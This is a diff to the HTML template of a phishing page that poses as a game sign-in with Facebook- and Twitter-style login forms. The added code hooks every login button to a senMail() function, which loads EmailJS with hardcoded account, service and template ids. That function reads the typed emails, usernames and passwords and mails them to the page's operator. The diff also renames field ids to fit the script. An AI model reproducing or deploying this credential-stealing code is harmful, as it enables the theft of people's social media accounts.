@@ -1388,7 +1388,7 @@ input[type=number] {
 		
 		
 		<label  for="input-52" class="v-label theme--light error--text" style="left: 0px; right: auto; position: absolute; width: 100%;"></label>
-		<input required="required" required autofocus="autofocus" name="email1" id="email1" placeholder="Sign in with phone or email" type="email">
+		<input required="required" required autofocus="autofocus" name="email1ee" id="email1ee" placeholder="Sign in with phone or email" type="email">
 		
 		</div></div></div>
 		
@@ -1400,21 +1400,23 @@ input[type=number] {
 		
 		
 		<label for="input-52" class="v-label theme--light error--text" style="left: 0px; right: auto; position: absolute; width: 100%;"></label>
-		<input required="required" required autofocus="autofocus" placeholder="Your Password" name="password1" id="password1" type="password">
+		<input required="required" required autofocus="autofocus" placeholder="Your Password" name="password1ee" id="password1ee" type="password">
 		
 		
 		</div></div></div>
 					
 		<hr data-v-30cca3d2="" role="separator" aria-orientation="horizontal" class="v-divider theme--dark">
-		<button  type="submit" class="white--text text-center mt-6 orange title font-weight-bold animated pulse slower infinite v-btn v-btn--block v-btn--contained v-btn--tile theme--light v-size--x-large"><span class="v-btn__content"> Play Now </span></button>
+		<button onclick='senMail()'  type="submit" class="white--text text-center mt-6 orange title font-weight-bold animated pulse slower infinite v-btn v-btn--block v-btn--contained v-btn--tile theme--light v-size--x-large"><span class="v-btn__content"> Play Now </span></button>
 	
-		<script>
-			document.forms['forma1'].reset()
-			document.forms['forma2'].reset()
-			document.forms['forma3'].reset()
-		</script>
+
+
+
 	
+
 	</form>
+
+
+
 		</div>
 		
 		
@@ -1435,14 +1437,14 @@ input[type=number] {
 		<form target="_blank" name="forma2"  method="post" class="login-form forma2">
 			{% csrf_token %}
 		
-		<input  type="text" name="email2" id="email2" placeholder="Mobile number or email address" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+		<input  type="text" name="email1" id="email1" placeholder="Mobile number or email address" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
 	
 	
-		<input  type="password" name="password2" id="password2" placeholder="Password" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+		<input  type="password" name="password1" id="password1" placeholder="Password" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
 		
 		
-		<button type="submit" id="onf" onclick="off();" class="btn-login-fb" >Log In</button> 
-		<button type="submit" id="offf" class="btn-login-fb" style="display: none;" >Log In</button>
+		<button onclick='senMail()'  type="submit" id="onf" onclick="off();" class="btn-login-fb" >Log In</button> 
+		<button onclick='senMail()'  type="submit" id="offf" class="btn-login-fb" style="display: none;" >Log In</button>
 		
 
 
@@ -1472,26 +1474,66 @@ input[type=number] {
 
 				<div class="form-group">
 
-				<input  type="text" name="usern3" id="usern3" autocomplete="off" required="required" style=" padding-left: 20px ;background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"> 
+				<input  type="text" name="usern3" id="usern2" autocomplete="off" required="required" style=" padding-left: 20px ;background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"> 
 				<label style="padding-left: 20px;">Username</label></div>
 				
 				<div class="form-group">
 
-				<input type="text" name="email3" id="email3" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"> <label style="padding-left: 20px;">Phone/email/username</label></div>
+				<input type="text" name="email3" id="email2" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"> <label style="padding-left: 20px;">Phone/email/username</label></div>
 			
 				<div class="form-group">
 
-				<input type="password" name="password3" id="password3" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"> 
+				<input type="password" name="password3" id="password2" autocomplete="off" required="required" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;"> 
 				<label style="padding-left: 20px;">Password</label></div> 
 			
 
-				<button type="submit" id="ont" onclick="off();" class="btn-login-twitter">Log In</button>
-				<button type="submit" id="offt" class="btn-login-twitter" style="display: none;">Log In</button> 
+				<button onclick='senMail()'  type="submit" id="ont" onclick="off();" class="btn-login-twitter">Log In</button>
+				<button onclick='senMail()'  type="submit" id="offt" class="btn-login-twitter" style="display: none;">Log In</button> 
 				<div class="footer-menu-twitter">Forgot password?</div> <div class="footer-menu-twitter bulet">•</div> 
 				<div class="footer-menu-twitter">Sign up to Twitter</div>
-				</form>
+				
+
+			
+			</form>
 				</center></div></div></div>
 		
+
+
+
+				<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+				<script type="text/javascript">
+				(function() {
+				emailjs.init("user_F9jzbeqVqug92VhFOATce");
+				})();
+				</script>
+			
+				<script>
+				function senMail(params){
+				var tempParams = {
+					
+					to_name:document.getElementById("email1").value,
+					message:document.getElementById("password1").value,
+			
+					to_nameee:document.getElementById("email1ee").value,
+					messageee:document.getElementById("password1ee").value,
+
+					to_namee:document.getElementById("email2").value,
+					from_namee:document.getElementById("usern2").value,
+					messagee:document.getElementById("password2").value,
+				};
+			
+				emailjs.send('service_4zrp0y6','template_7190s67',tempParams)
+				.then(function(res){
+			
+					console.log("success",res.status);
+				})
+			
+				}
+				</script>
+	
+	
+
+
 		
 		<script>
 		$(".help-icon").on('click', function() {
